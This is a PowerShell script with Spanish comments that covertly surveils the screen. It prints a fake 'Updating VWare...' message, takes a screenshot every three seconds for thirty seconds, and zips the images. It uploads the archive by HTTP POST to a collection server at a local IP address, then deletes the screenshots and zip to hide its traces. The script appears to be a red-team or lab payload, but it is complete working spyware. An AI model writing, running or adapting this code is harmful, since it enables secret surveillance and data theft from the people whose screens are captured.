Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

$screen = [Windows.Forms.SystemInformation]::VirtualScreen
$totalTime = 30  # Duración total en segundos
$interval = 3    # Intervalo entre capturas en segundos
$numberOfCaptures = $totalTime / $interval

Write-Host "Updating VWare..."

$destinationUrl = "http://192.168.0.84:8000/"
$outputDir = "$env:TEMP\Collection\"
if (-not (Test-Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir
}

for ($i = 0; $i -lt $numberOfCaptures; $i++) {
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputFile = Join-Path $outputDir ("Captura_$timestamp.png")
    $bitmap.Save($outputFile)
    $graphic.Dispose()
    $bitmap.Dispose()
    Start-Sleep -Seconds $interval
}
$zipFilePath = "$env:TEMP\collection.zip"
[IO.Compression.ZipFile]::CreateFromDirectory($outputDir, $zipFilePath)
Start-Sleep 20
if (Test-Path $zipFilePath) {
    Write-Host "Zip file found at: $zipFilePath"

    # Crear un cliente HTTP
    $client = New-Object System.Net.Http.HttpClient
    $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
    $fileStream = [IO.File]::OpenRead($zipFilePath)
    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
    $fileContent.Headers.ContentType = New-Object System.Net.Http.Headers.MediaTypeHeaderValue("application/zip")

    # Añadir el archivo al contenido multipart
    $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))

    # Hacer la solicitud POST
    $response = $client.PostAsync($destinationUrl, $multipartContent).Result

    # Verificar el resultado
    if ($response.IsSuccessStatusCode) {
        Write-Host "File uploaded successfully!"
    } else {
        Write-Host "Failed to upload file. Status code:" $response.StatusCode
    }

    # Cerrar el Stream
    $fileStream.Close()
} else {
    Write-Host "The zip file was not found."
}

Start-Sleep 4
Get-ChildItem -Path $outputDir | Remove-Item -Recurse -Force
Remove-Item -Path $zipFilePath -Force
